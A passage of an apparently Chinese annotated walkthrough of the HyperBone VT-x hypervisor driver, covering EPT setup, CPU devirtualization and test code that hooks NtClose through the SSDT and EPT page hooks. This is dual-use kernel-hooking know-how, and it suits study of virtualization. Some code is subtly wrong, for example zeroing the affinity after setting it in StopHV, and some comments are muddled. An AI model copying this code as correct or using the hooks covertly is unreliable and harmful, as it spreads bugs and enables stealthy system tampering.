在Windows内核中，0和3级特权级别都可以引用内核GDT中的所有段描述符，因此不需要进行RPL屏蔽。 但是，在某些情况下，为了安全起见，可能会使用引用GDT的低特权级别来访问只有高特权级别才能访问的内存段。 在这种情况下，需要进行RPL屏蔽来确保代码可以访问相应的内存段。 */ // 屏蔽RPL位 PKGDTENTRY64 gdtEntry = NULL; NT_ASSERT( (Selector &amp; SELECTOR_TABLE_INDEX) == 0 ); gdtEntry = (PKGDTENTRY64)((ULONG_PTR)GdtBase + (Selector &amp; ~RPL_MASK)); // 将传入的段选择子赋值给VMX_GDTENTRY64结构体的Selector字段 VmxGdtEntry-&gt;Selector = Selector; // 使用LSL指令（Load Segment Limit）读取段限制（segment limit）。 VmxGdtEntry-&gt;Limit = __segmentlimit( Selector ); /* 在x86体系结构中，段描述符中的“System”位（也称为“S”位）用于区分系统段和代码/数据段。 当“System”位被清除时（即为0），表示这是一个代码段或数据段，需要对相对虚拟地址（RVA）进行地址计算。 将段基址与RVA相加，构建完整的64位有效地址。 对于非系统段，需要进行以下步骤来构建完整的64位线性地址： 将段基址与RVA相加，得到32位的线性地址。 将线性地址的高32位与段选择子中的基地址合并，构建出64位的线性地址。 */ /* 需要注意的是，在Windows操作系统中，KGDTENTRY64结构中的“System”字段位置被定义错误了， 实际上，“System”位应该编码在“Type”字段的最高位。这意味着在Windows内核中计算64位地址时需要特别小心， 以确保不会使用错误的字段。 */ /* 根据GDT中的字段信息，构建完整的64位有效地址。需要注意的是，只有当Type字段中的System位为0时才进行构建。 构建过程分为三部分：将BaseHigh字段左移24位，将BaseMiddle字段左移16位，将BaseLow字段保持不变， 并使用逻辑或运算符组合它们。如果Type字段中的最高位为0， 则还需要将BaseUpper字段左移32位并与之前的结果进行逻辑或运算。 */ VmxGdtEntry-&gt;Base = ((gdtEntry-&gt;Bytes.BaseHigh &lt;&lt; 24) | (gdtEntry-&gt;Bytes.BaseMiddle &lt;&lt; 16) | (gdtEntry-&gt;BaseLow)) &amp; MAXULONG; VmxGdtEntry-&gt;Base |= ((gdtEntry-&gt;Bits.Type &amp; 0x10) == 0) ? ((ULONG_PTR)gdtEntry-&gt;BaseUpper &lt;&lt; 32) : 0; // 加载访问权限信息 VmxGdtEntry-&gt;AccessRights = 0; VmxGdtEntry-&gt;Bytes.Flags1 = gdtEntry-&gt;Bytes.Flags1; VmxGdtEntry-&gt;Bytes.Flags2 = gdtEntry-&gt;Bytes.Flags2; // 处理VMX相关的位 VmxGdtEntry-&gt;Bits.Reserved = 0; VmxGdtEntry-&gt;Bits.Unusable = !gdtEntry-&gt;Bits.Present;&#125; 将当前状态存储在栈中，并跳转到一个 C 函数 VmxpExitHandler 中去处理 VM 的 exit 事件123456789101112131415VmxVMEntry PROC push rcx ; save RCX, as we will need to orverride it lea rcx, [rsp+8h] ; store the context in the stack, bias for ; the return address and the push we just did. call RtlCaptureContext ; save the current register state. ; note that this is a specially written function ; which has the following key characteristics: ; 1) it does not taint the value of RCX ; 2) it does not spill any registers, nor ; expect home space to be allocated for it jmp VmxpExitHandler ; jump to the C code handler. we assume that it ; compiled with optimizations and does not use ; home space, which is true of release builds.VmxVMEntry ENDP 初始化EPT，创建Guest到Host的页映射（Page Mappings） 为了解决GVA-GPA-HPA的转换关系，在没有硬件辅助的时代，Hypervisor通过影子页表，很巧妙的将GVA-GPA映射到GVA-HPA, 功能虽然达成，但是在很多实际场景下，如进程频繁切换，内存频繁分配释放等，性能损耗会非常大； EPT在硬件的帮助下，实现内存虚拟化简单直接，传统页表继续负责GVA-GPA, 而EPT负责GPA-HPA; 虽然内存访问延时可能会增加一些，但是大幅减少了因为页表更新带来的vmexit, 综合性价比提升巨大, 所以现代内存虚拟化，基本都被EPT统一了。 1234567891011121314151617181920212223242526272829303132333435/// &lt;summary&gt;/// Create Guest to Host page mappings/// &lt;/summary&gt;/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS EptBuildIdentityMap( IN PEPT_DATA pEPT )&#123; if (pEPT-&gt;PML4Ptr != NULL) return STATUS_SUCCESS;// 已经创建过 /* PML4（Page Map Level 4）是 x86 架构中分页机制的一级页表。 在 x86 架构的分页机制中，物理内存被划分为固定大小的页面（通常为4KB）。 为了管理这些页面，操作系统使用页表来建立虚拟地址与物理地址之间的映射关系。 页表被组织为一个多级结构，其中 PML4 是最高级的页表。 PML4 是一个包含512个表项的数组，每个表项（PML4 Entry）的大小为8字节。 每个表项对应着一个 PDP（Page Directory Pointer）表，PDP 表进一步将虚拟地址映射到下一级的页表， 直到最后一级页表（称为页表 PDT）。 通过多级的页表结构，操作系统可以灵活地管理大量的内存页面，并实现虚拟地址到物理地址的映射。 PML4 负责管理最高级的页表，它的物理地址必须在处理器的控制寄存器（CR3）中设置， 以使处理器能够正确进行地址转换。 */ pEPT-&gt;PML4Ptr = (PEPT_PML4_ENTRY)EptpAllocatePage( pEPT );// 分配一个页面作为PML4表表项 if (pEPT-&gt;PML4Ptr == NULL) return STATUS_INSUFFICIENT_RESOURCES;// 错误则表示内存资源不足 NTSTATUS status = EptpFillTable( pEPT, pEPT-&gt;PML4Ptr );// 填充PML4表，创建其他级别的页表和映射关系 if (!NT_SUCCESS( status )) EptFreeIdentityMap( pEPT );// 创建失败则释放资源 //DPRINT( &quot;HyperBone: CPU %d: %s: Used pages %d\\n&quot;, CPU_IDX, __FUNCTION__, pEPT-&gt;TotalPages ); return status;&#125; 分配EPT页面1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677/// &lt;summary&gt;/// Allocate page for PTE table/// &lt;/summary&gt;/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;/// &lt;returns&gt;Allocated page or NULL&lt;/returns&gt;PEPT_MMPTE EptpAllocatePage( IN PEPT_DATA pEPT )&#123; /* IRQL（Interrupt Request Level）是Windows操作系统中用于表示中断请求的优先级的概念。 它用于控制不同中断的处理顺序，以确保系统正常运行并防止冲突。 在Windows内核中，存在多个不同的IRQL级别，从最低的PASSIVE_LEVEL到最高的HIGH_LEVEL。 较低的IRQL级别表示较低的中断优先级，而较高的IRQL级别表示较高的中断优先级。 例程（Routine）是指一段代码或函数，通常用于执行特定的任务或功能。 */ /* 检查当前IRQL是否大于DISPATCH_LEVEL，如果大于意味着在此级别以上的中断处理程序中， 使用内存分配例程会发生错误，因此直接调用高IRQL情况下的页面分配函数。 */ if (KeGetCurrentIrql() &gt; DISPATCH_LEVEL) return EptpAllocatePageHighIRQL( pEPT ); PHYSICAL_ADDRESS Highest = &#123; 0 &#125;, Lowest = &#123; 0 &#125;;// 物理地址 Highest.QuadPart = ~0;// 全部置为1，设为最大物理地址 // 分配连续的、指定缓存类型的内存页面，页面大小为PAGE_SIZE(4kb) PEPT_MMPTE ptr = (PEPT_MMPTE)MmAllocateContiguousMemorySpecifyCache( PAGE_SIZE, Lowest, Highest, Lowest, MmNonCached ); // 成功分配 Save page ptr in array if (ptr) &#123; pEPT-&gt;TotalPages++;// 增加已分配页面数量 RtlZeroMemory( ptr, PAGE_SIZE ); BOOLEAN allocEntry = FALSE; PEPT_PAGES_ENTRY pEntry = NULL; if (IsListEmpty( &amp;pEPT-&gt;PageList ))// 检查EPT页链表是否为空 &#123; allocEntry = TRUE;// 需要分配一个新的列表入口 &#125; else &#123; pEntry = CONTAINING_RECORD( pEPT-&gt;PageList.Flink, EPT_PAGES_ENTRY, link ); if (pEntry-&gt;count &gt;= PAGES_PER_ENTRY)// 检查当前列表入口是否已满 allocEntry = TRUE; &#125; if (allocEntry)// 需要分配一个新的列表入口 &#123; // 从指定NonPagedPoolNx内存池中分配内存，大小为EPT_PAGES_ENTRY结构体大小 pEntry = ExAllocatePoolWithTag( NonPagedPoolNx, sizeof( EPT_PAGES_ENTRY ), HB_POOL_TAG ); if (pEntry == NULL) &#123; DPRINT( &quot;HyperBone: CPU %d: %s: Failed to allocate EPT_PAGES_ENTRY struct\\n&quot;, CPU_IDX, __FUNCTION__ ); return ptr; &#125; RtlZeroMemory( pEntry, sizeof( EPT_PAGES_ENTRY ) ); pEntry-&gt;pages[pEntry-&gt;count] = ptr; pEntry-&gt;count++; InsertHeadList( &amp;pEPT-&gt;PageList, &amp;pEntry-&gt;link );// 将新的列表入口插到EPT页链表头部 &#125; else &#123; // 不需要分配，直接记录 pEntry-&gt;pages[pEntry-&gt;count] = ptr; pEntry-&gt;count++; &#125; &#125; else &#123; DPRINT( &quot;HyperBone: CPU %d: %s: Failed to allocate EPT page\\n&quot;, CPU_IDX, __FUNCTION__ ); ASSERT( FALSE ); &#125; return ptr;&#125; -在更高级的IRQL申请页面123456789101112131415161718/// &lt;summary&gt;/// Allocate page at IRQL &gt; DISPATCH_LEVEL/// &lt;/summary&gt;/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;/// &lt;returns&gt;Allocated page or NULL&lt;/returns&gt;PEPT_MMPTE EptpAllocatePageHighIRQL( IN PEPT_DATA pEPT )&#123; // 检查预分配页面数量是否小于预分配页面数量上限 if (pEPT-&gt;Preallocations &lt; EPT_PREALLOC_PAGES) &#123; PEPT_MMPTE ptr = pEPT-&gt;Pages[pEPT-&gt;Preallocations];// 将预分配页面数组中的下一个页面指针赋给ptr pEPT-&gt;Preallocations++; return ptr; &#125; // 没有页面可以分配，触发蓝屏 KeBugCheckEx( HYPERVISOR_ERROR, BUG_CHECK_EPT_NO_PAGES, pEPT-&gt;Preallocations, EPT_PREALLOC_PAGES, 0 );&#125; 根据已使用的物理区域填充 PML4 表1234567891011121314151617181920212223242526272829303132333435363738394041/// &lt;summary&gt;/// Fill PML4 table accordingly to used physical regions/// &lt;/summary&gt;/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;/// &lt;param name=&quot;PML4Ptr&quot;&gt;EPT PML4 pointer&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS EptpFillTable( IN PEPT_DATA pEPT, IN PEPT_PML4_ENTRY PML4Ptr )&#123; NT_ASSERT( PML4Ptr != NULL );// 断言PML4Ptr不为空 if (PML4Ptr == NULL) return STATUS_INVALID_PARAMETER; // 遍历已使用的物理内存区域填充PML4表 for (ULONG i = 0; i &lt; g_Data-&gt;Memory-&gt;NumberOfRuns; i++) &#123; // 计算该物理区域可用于填充表的页数，取总页数和EPT表项数的最小值 ULONG64 first = g_Data-&gt;Memory-&gt;Run[i].BasePage; ULONG64 total = g_Data-&gt;Memory-&gt;Run[i].PageCount; ULONG64 count = min( total, EPT_TABLE_ENTRIES - (first &amp; (EPT_TABLE_ENTRIES - 1)) ); // 初始化物理页帧号为first ULONG64 hostPFN = first; for (ULONG64 pfn = first; total &gt; 0;) &#123; // 嵌套调用EptUpdateTableRecursive函数，填充PML4表 if (!NT_SUCCESS( EptUpdateTableRecursive( pEPT, PML4Ptr, EPT_TOP_LEVEL, pfn, EPT_ACCESS_ALL, hostPFN, (ULONG)count ) )) return STATUS_UNSUCCESSFUL; // 更新pfn、hostPFN和total pfn += count; hostPFN += count; total -= count; count = min( total, EPT_TABLE_ENTRIES - (pfn &amp; (EPT_TABLE_ENTRIES - 1)) ); &#125; &#125; /*for (ULONG64 pfn = 0; pfn &lt;= 0xFEE00; pfn += EPT_TABLE_ENTRIES, hostPFN += EPT_TABLE_ENTRIES) &#123; if (!NT_SUCCESS( EptUpdateTableRecursive( PML4Ptr, 3, pfn, EPT_ACCESS_ALL, hostPFN, EPT_TABLE_ENTRIES ) )) return STATUS_UNSUCCESSFUL; &#125;*/ return STATUS_SUCCESS;&#125; -递归更新EPT表项1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/// &lt;summary&gt;/// Update EPT entry/// &lt;/summary&gt;/// &lt;param name=&quot;pEPTData&quot;&gt;CPU EPT data&lt;/param&gt;/// &lt;param name=&quot;pTable&quot;&gt;EPT table&lt;/param&gt;/// &lt;param name=&quot;level&quot;&gt;EPT table level&lt;/param&gt;/// &lt;param name=&quot;pfn&quot;&gt;Page frame number to update&lt;/param&gt;/// &lt;param name=&quot;access&quot;&gt;New PFN access&lt;/param&gt;/// &lt;param name=&quot;hostPFN&quot;&gt;New hot PFN&lt;/param&gt;/// &lt;param name=&quot;count&quot;&gt;Number of entries to update&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS EptUpdateTableRecursive( IN PEPT_DATA pEPTData, IN PEPT_MMPTE pTable, IN EPT_TABLE_LEVEL level, IN ULONG64 pfn, IN UCHAR access, IN ULONG64 hostPFN, IN ULONG count )&#123; if (level == EPT_LEVEL_PTE) &#123; // PTE表示已递归到最底层 // 避免越界 ULONG64 first = EptpTableOffset( pfn, level ); ASSERT( first + count &lt;= EPT_TABLE_ENTRIES ); // 根据访问权限设置对应字段 PEPT_PTE_ENTRY pPTE = (PEPT_PTE_ENTRY)pTable; for (ULONG64 i = first; i &lt; first + count; i++, hostPFN++) &#123; pPTE[i].Fields.Read = (access &amp; EPT_ACCESS_READ) != 0; pPTE[i].Fields.Write = (access &amp; EPT_ACCESS_WRITE) != 0; pPTE[i].Fields.Execute = (access &amp; EPT_ACCESS_EXEC) != 0; pPTE[i].Fields.MemoryType = VMX_MEM_TYPE_WRITEBACK; pPTE[i].Fields.PhysAddr = hostPFN;// 物理地址字段为hostPFN &#125; return STATUS_SUCCESS; &#125; ULONG64 offset = EptpTableOffset( pfn, level );// 计算要更新的 EPT 表项在指定表中的偏移量 PEPT_MMPTE pEPT = &amp;pTable[offset];// 要更新的 EPT 表中的具体表项 PEPT_MMPTE pNewEPT = 0; if (pEPT-&gt;Fields.PhysAddr == 0) &#123; // 表示该表项未分配页面，需要分配一个页面 pNewEPT = (PEPT_MMPTE)EptpAllocatePage( pEPTData ); if (pNewEPT == NULL) return STATUS_INSUFFICIENT_RESOURCES; // 设置表示存在，可写，可执行和物理地址 pEPT-&gt;Fields.Present = 1; pEPT-&gt;Fields.Write = 1; pEPT-&gt;Fields.Execute = 1; pEPT-&gt;Fields.PhysAddr = PFN( MmGetPhysicalAddress( pNewEPT ).QuadPart ); &#125; else &#123; // 表示该表项已分配页面，通过物理地址获取其虚拟地址 PHYSICAL_ADDRESS phys = &#123; 0 &#125;; phys.QuadPart = pEPT-&gt;Fields.PhysAddr &lt;&lt; 12; pNewEPT = MmGetVirtualForPhysical( phys ); &#125; return EptUpdateTableRecursive( pEPTData, pNewEPT, level - 1, pfn, access, hostPFN, count );&#125; –计算 EPT 表项索引（Table Index）12345678910111213141516171819/// &lt;summary&gt;/// EPT entry index in table/// &lt;/summary&gt;/// &lt;param name=&quot;pfn&quot;&gt;EPT PFN&lt;/param&gt;/// &lt;param name=&quot;level&quot;&gt;EPT level&lt;/param&gt;/// &lt;returns&gt;Table index&lt;/returns&gt;inline ULONG64 EptpTableOffset( IN ULONG64 pfn, IN CHAR level )&#123; /* 首先定义一个掩码（mask），用于提取指定层级的表项索引。 这里使用位运算来生成掩码，具体生成方式为 1 左移 ((level + 1) * EPT_TABLE_ORDER) 位，然后减去 1， 得到了一个所有位都置为 1 的掩码。 将掩码与 PFN 进行按位与操作，目的是提取出指定层级的表项索引。 按位与操作会将掩码中相应位为 0 的位置上的 PFN 位也设置为 0，从而提取出表项索引。 最后，将提取出的表项索引右移 (level * EPT_TABLE_ORDER) 位，将其放置在正确的位置上，并作为函数返回值。 */ ULONG64 mask = (1ULL &lt;&lt; ((level + 1) * EPT_TABLE_ORDER)) - 1; return (pfn &amp; mask) &gt;&gt; (level * EPT_TABLE_ORDER);&#125; 在CPU上开启EPT123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/// &lt;summary&gt;/// Enable EPT for CPU/// &lt;/summary&gt;/// &lt;param name=&quot;PML4&quot;&gt;PML4 pointer to use&lt;/param&gt;VOID EptEnable( IN PEPT_PML4_ENTRY PML4 )&#123; /* 基本CPU执行控制是一组CPU执行控制位，用于控制处理器在VMX操作期间的行为。 这些控制位包括启用VMX操作、允许或阻止对VMCS的加载或存储、中断虚拟化、启用或禁用NMI虚拟化、 读取或屏蔽虚拟-NMI信息等。这些控制位可通过VMXON指令设置， 也可以通过VMClear和VMLaunch指令清除并重新加载来更新。 二级CPU执行控制是一组掩码，用于启用或禁用一组次要的、特殊的、可选的处理器功能。 这些控制位包括启用或禁用EPT、启用或禁用VPID、启用或禁用虚拟处理器退出控制、启用或禁用VMFUNC指令、 CR3传递、IO位图中断虚拟化、APIC虚拟化等。 这些控制位可以通过设置MSR IA32_VMX_PROCBASED_CTLS2寄存器来更新。 */ VMX_CPU_BASED_CONTROLS primary = &#123; 0 &#125;;// 基本CPU执行控制 VMX_SECONDARY_CPU_BASED_CONTROLS secondary = &#123; 0 &#125;;// 二级CPU执行控制 EPT_TABLE_POINTER EPTP = &#123; 0 &#125;;// EPT指针 // 读取相应寄存器的值 __vmx_vmread( SECONDARY_VM_EXEC_CONTROL, (size_t*)&amp;secondary.All ); __vmx_vmread( CPU_BASED_VM_EXEC_CONTROL, (size_t*)&amp;primary.All ); // 设置EPTP（EPT表指针）的字段值。 // 将EPTP的物理地址字段设置为PML4的物理地址（MmGetPhysicalAddress(PML4)），并将其右移12位（相当于除以4096）， // 以获取正确的页帧号。将页表的长度设置为3，表示EPT有4级表（PML4、PDPT、PD和PT）。 EPTP.Fields.PhysAddr = MmGetPhysicalAddress( PML4 ).QuadPart &gt;&gt; 12; EPTP.Fields.PageWalkLength = 3; // 将EPTP的值写入EPT_POINTER VMCS字段中，以启用EPT。 __vmx_vmwrite( EPT_POINTER, EPTP.All ); // 将虚拟处理器标识符（VPID）写入VMCS中，以启用VPID。 __vmx_vmwrite( VIRTUAL_PROCESSOR_ID, VM_VPID ); primary.Fields.ActivateSecondaryControl = TRUE;// 激活二级CPU执行控制 secondary.Fields.EnableEPT = TRUE;// 启用EPT if(g_Data-&gt;Features.VPID) secondary.Fields.EnableVPID = TRUE;// 启用VPID // 将更新后的值写入VMCS中 __vmx_vmwrite( SECONDARY_VM_EXEC_CONTROL, secondary.All ); __vmx_vmwrite( CPU_BASED_VM_EXEC_CONTROL, primary.All ); // 刷新EPT上下文，并从ctx拿到上下文信息 EPT_CTX ctx = &#123; 0 &#125;; __invept( INV_ALL_CONTEXTS, &amp;ctx ); //DPRINT( &quot;HyperBone: CPU %d: %s: EPT enabled\\n&quot;, CPU_NUM, __FUNCTION__ );&#125; 刷新EPT上下文1234__invept PROC invept rcx, OWORD PTR [rdx] ret__invept ENDP AMD CPU 不支持123456inline VOID AMDSubvertCPU( IN PVCPU Vcpu, IN PVOID arg )&#123; UNREFERENCED_PARAMETER( Vcpu ); UNREFERENCED_PARAMETER( arg ); DPRINT( &quot;HyperBone: CPU %d: %s: AMD-V not yet supported\\n&quot;, CPU_IDX, __FUNCTION__ );&#125; 释放IntelCPU123456inline VOID IntelRestoreCPU( IN PVCPU Vcpu )&#123; // Prevent execution of VMCALL on non-vmx CPU if (Vcpu-&gt;VmxState &gt; VMX_STATE_OFF) VmxShutdown( Vcpu );&#125; 从根模式切换回非根模式1234567891011121314151617181920212223242526/// &lt;summary&gt;/// Revert CPU to non-root mode/// &lt;/summary&gt;/// &lt;param name=&quot;Vcpu&quot;&gt;Virtual CPU data&lt;/param&gt;VOID VmxShutdown( IN PVCPU Vcpu )&#123; //DPRINT( &quot;HyperBone: CPU %d: %s: CR3 load count %d\\n&quot;, CPU_IDX, __FUNCTION__, Vcpu-&gt;Cr3Loads ); __vmx_vmcall( HYPERCALL_UNLOAD, 0, 0, 0 );// 通知VMM卸载所加载的虚拟机 VmxVMCleanup( KGDT64_R3_DATA | RPL_MASK, KGDT64_R3_CMTEB | RPL_MASK );// 清除VMX相关设置 // 释放EPT的身份映射 EptFreeIdentityMap( &amp;Vcpu-&gt;EPT ); // 释放数据结构VMXON、VMCS和VMM堆栈内存 if (Vcpu-&gt;VMXON) MmFreeContiguousMemory( Vcpu-&gt;VMXON ); if (Vcpu-&gt;VMCS) MmFreeContiguousMemory( Vcpu-&gt;VMCS ); if (Vcpu-&gt;VMMStack) MmFreeContiguousMemory( Vcpu-&gt;VMMStack ); Vcpu-&gt;VMXON = NULL; Vcpu-&gt;VMCS = NULL; Vcpu-&gt;VMMStack = NULL;&#125; 通知VMM1234__vmx_vmcall PROC vmcall ret__vmx_vmcall ENDP 清除VMX相关设置123456VmxVMCleanup PROC mov ds, cx ; set DS to parameter 1 mov es, cx ; set ES to parameter 1 mov fs, dx ; set FS to parameter 2 ret ; returnVmxVMCleanup ENDP 释放EPT的身份映射1234567891011121314151617181920212223242526272829303132/// &lt;summary&gt;/// Release Guest to Host page mappings/// &lt;/summary&gt;/// &lt;param name=&quot;pEPT&quot;&gt;CPU EPT data&lt;/param&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS EptFreeIdentityMap( IN PEPT_DATA pEPT )&#123; // 检查PML4表是否为空 if (pEPT-&gt;PML4Ptr == NULL) return STATUS_SUCCESS; // 释放PML4表 pEPT-&gt;PML4Ptr = NULL; // 循环释放EPT页链表中每个表项的所有页面 while (!IsListEmpty( &amp;pEPT-&gt;PageList )) &#123; PLIST_ENTRY pListEntry = pEPT-&gt;PageList.Flink; // 获取列表入口的地址 从结构的成员指针得到结构的起始地址 PEPT_PAGES_ENTRY pEntry = CONTAINING_RECORD( pListEntry, EPT_PAGES_ENTRY, link ); for (ULONG i = 0; i &lt; pEntry-&gt;count; i++) // 释放表项的每个页面 if (pEntry-&gt;pages[i] != NULL) MmFreeContiguousMemory( pEntry-&gt;pages[i] ); // 移除当前表项，并释放内存空间 RemoveEntryList( pListEntry ); ExFreePoolWithTag( pListEntry, HB_POOL_TAG ); &#125; // 表示释放了预分配的内存空间 pEPT-&gt;Preallocations = 0; return STATUS_SUCCESS;&#125; AMD不支持12345inline VOID AMDRestoreCPU( IN PVCPU Vcpu )&#123; UNREFERENCED_PARAMETER( Vcpu ); DPRINT( &quot;HyperBone: CPU %d: %s: AMD-V not yet supported\\n&quot;, CPU_IDX, __FUNCTION__ );&#125; 停止虚拟化123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172/// &lt;summary&gt;/// Devirtualize each CPU/// &lt;/summary&gt;/// &lt;returns&gt;Status code&lt;/returns&gt;NTSTATUS StopHV()&#123; // Unknown CPU if (g_Data-&gt;CPUVendor == CPU_Other) return STATUS_NOT_SUPPORTED; /* 如果在当前的上下文中调用 KeGenericCallDpc 并将当前线程切换到另一个处理器上执行回调函数，可能会导致死锁。 死锁是指两个或多个线程互相等待对方所持有的资源。在这种情况下，如果回调函数依赖于当前线程的某些资源， 并且该资源在其他处理器上被另一个线程持有，那么当前线程会一直等待资源释放，从而导致死锁。 为了避免潜在的死锁风险，作者决定屏蔽调用 KeGenericCallDpc 函数的代码， 并采用其他方式来停止虚拟化的每个CPU。 */ // KeGenericCallDpc( HvmpHVCallbackDPC, NULL ); there will be Dead Lock // 获取系统中活动处理器的数量，并循环依次处理每个处理器 ULONG number_of_processors = KeQueryActiveProcessorCountEx(ALL_PROCESSOR_GROUPS); for (ULONG processor_index = 0; processor_index &lt; number_of_processors; processor_index++) &#123; PROCESSOR_NUMBER processor_number; RtlZeroMemory(&amp;processor_number, sizeof(PROCESSOR_NUMBER)); // 获取当前处理器的PROCESSOR_NUMBER处理器编号结构体 NTSTATUS status = KeGetProcessorNumberFromIndex(processor_index, &amp;processor_number); if (!NT_SUCCESS(status)) &#123; DbgBreakPoint(); &#125; // Switch the current processor GROUP_AFFINITY affinity; RtlZeroMemory(&amp;affinity, sizeof(GROUP_AFFINITY)); // 表示将当前处理器作为目标处理器 affinity.Group = processor_number.Group; affinity.Mask = 1ull &lt;&lt; processor_number.Number; /* 系统组亲和性（System Group Affinity）是一种将线程限制在特定处理器组上运行的机制。 在支持 NUMA（非统一内存访问）的系统中，处理器分为多个组，每个组具有自己的本地内存和其他资源。 通过设置线程的系统组亲和性，可以使线程优先在特定的处理器组上运行，以提高性能和资源的局部性。 KeSetSystemGroupAffinityThread 函数用于设置线程的系统组亲和性。它接受一个参数affinity， 表示要设置的系统组亲和性信息。affinity 结构体中的字段包括 Mask 和 Group， 分别表示处理器组掩码和组索引。通过调用该函数，可以将线程限制在指定的处理器组上运行。 将原本的信息返回到previous_affinity KeRevertToUserGroupAffinityThread 函数用于恢复线程的用户组亲和性。当线程的系统组亲和性被设置后， 如果希望将其恢复为默认的用户组亲和性，则可以调用该函数。 */ GROUP_AFFINITY previous_affinity; RtlZeroMemory(&amp;affinity, sizeof(GROUP_AFFINITY)); // 将当前线程切换到目标处理器 KeSetSystemGroupAffinityThread(&amp;affinity, &amp;previous_affinity); // 获取指向当前处理器的指针，停止该处理器的虚拟化 PVCPU pVCPU = &amp;g_Data-&gt;cpu_data[processor_index]; IntelRestoreCPU(pVCPU); // 将当前线程切换回原来的处理器 KeRevertToUserGroupAffinityThread(&amp;previous_affinity); if (!NT_SUCCESS(status)) &#123; DbgBreakPoint(); &#125; &#125; return STATUS_SUCCESS;&#125; 开始测试123456789101112131415161718192021222324252627282930313233VOID TestStart( IN BOOLEAN SyscallHook, IN BOOLEAN PageHook1, IN IN BOOLEAN PageHook2 )&#123; if (PageHook1) &#123; TestPageHook();// 测试页面钩子 &#125; // 尝试获取 NtClose 系统调用函数的地址，并将其保存到全局变量 g_NtClose 中。 g_NtClose = (PVOID)UtilSSDTEntry( SSDTIndex( &amp;ZwClose ) ); if (g_NtClose) &#123; // 如果获取到 if (SyscallHook) &#123; if (NT_SUCCESS( SHInitHook() ))// 系统调用入口钩子 SHHookSyscall( SSDTIndex( &amp;ZwClose ), (PVOID)hkNtClose, 1 );// 将系统调用函数的地址与自定义hkNtClose进行钩子绑定 else DPRINT( &quot;HyperBone: CPU %d: %s: SHInitHook() failed\\n&quot;, CPU_IDX, __FUNCTION__ ); &#125; if (PageHook2) &#123; if (g_NtClose) &#123; if (!NT_SUCCESS( PHHook( g_NtClose, (PVOID)hkNtClose2 ) ))// 将全局系统调用函数的地址与自定义hkNtClose2进行钩子绑定 DPRINT( &quot;HyperBone: CPU %d: %s: PHHook() failed\\n&quot;, CPU_IDX, __FUNCTION__ ); &#125; else DPRINT( &quot;HyperBone: CPU %d: %s: NtClose not found\\n&quot;, CPU_IDX, __FUNCTION__ ); &#125; &#125; else DPRINT( &quot;HyperBone: CPU %d: %s: NtClose not found\\n&quot;, CPU_IDX, __FUNCTION__ );&#125; 测试页面钩子1234567891011121314151617181920212223242526VOID TestPageHook()&#123; // 缓冲区 UCHAR buf[32] = &#123; 0 &#125;; // TestFn函数地址 PVOID pFn = (PVOID)TestFn; // 复制函数地址前16字节到缓冲区，调用TestFn函数 RtlCopyMemory( buf, pFn, 16 ); DPRINT( &quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\\n&quot;, CPU_IDX, __FUNCTION__, *(PULONG64)buf, TestFn( 100, 5 ) ); // 将pFn地址与hkTestFn函数进行钩子绑定 PHHook( pFn, (PVOID)hkTestFn ); // 再次复制函数地址前16字节到缓冲区 // 此时钩子生效，调用TestFn函数时，实际上调用的是hkTestFn函数 RtlCopyMemory( buf, pFn, 16 ); DPRINT( &quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\\n&quot;, CPU_IDX, __FUNCTION__, *(PULONG64)buf, TestFn( 100, 5 ) ); // 恢复钩子 PHRestore( pFn ); // 再次复制函数地址前16字节到缓冲区，查看结果 RtlCopyMemory( buf, pFn, 16 ); DPRINT( &quot;HyperBone: CPU %d: %s: Buffer contents: 0x%p, Call result 0x%X\\n&quot;, CPU_IDX, __FUNCTION__, *(PULONG64)buf, TestFn( 100, 5 ) );&#125; TestFn12345678910// 指示放在.text0段中#pragma alloc_text(&quot;.text0&quot;, TestFn)ULONG64 TestFn( ULONG64 in1, ULONG64 in2 )&#123; // 对传入的参数进行一些数学运算 ULONG64 data1 = 0x500; data1 += in1; in2 -= 0x10; return in1 + in2 * 3 - in1 / in2 + data1;&#125; hkTestFn1234567891011#pragma alloc_text(&quot;.text1&quot;, hkTestFn)ULONG64 hkTestFn( ULONG64 in1, ULONG64 in2 )&#123; // 获取 TestFn 函数的 hook entry PPAGE_HOOK_ENTRY pEntry = PHGetHookEntry( (PVOID)(ULONG_PTR)TestFn ); if (pEntry) // 将其 OriginalData 字段转换为函数指针，并调用原始函数，传入参数 in1 和 in2。 ((ULONG64( *)(ULONG64, ULONG64))(ULONG_PTR)pEntry-&gt;OriginalData)(in1, in2); // 返回固定值 return 0xDEADBEEF;&#125; 获取对应函数的HookEntry12345678910111213141516171819202122/// &lt;summary&gt;/// Get hook data by function pointer/// &lt;/summary&gt;/// &lt;param name=&quot;ptr&quot;&gt;Function address&lt;/param&gt;/// &lt;returns&gt;Found entry or NULL&lt;/returns&gt;PPAGE_HOOK_ENTRY PHGetHookEntry( IN PVOID ptr )&#123; if (g_PageList.Flink == NULL || IsListEmpty( &amp;g_PageList )) return NULL; // 遍历g_PageList查找匹配的HookEntry钩子入口数据结构 for (PLIST_ENTRY pListEntry = g_PageList.Flink; pListEntry != &amp;g_PageList; pListEntry = pListEntry-&gt;Flink) &#123; // 计算PAGE_HOOK_ENTRY结构体的地址 PPAGE_HOOK_ENTRY pEntry = CONTAINING_RECORD( pListEntry, PAGE_HOOK_ENTRY, Link ); // 判断是否找到了匹配的PAGE_HOOK_ENTRY if (pEntry-&gt;OriginalPtr == ptr) return pEntry; &#125; return NULL;&#125; 页面钩子123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/// 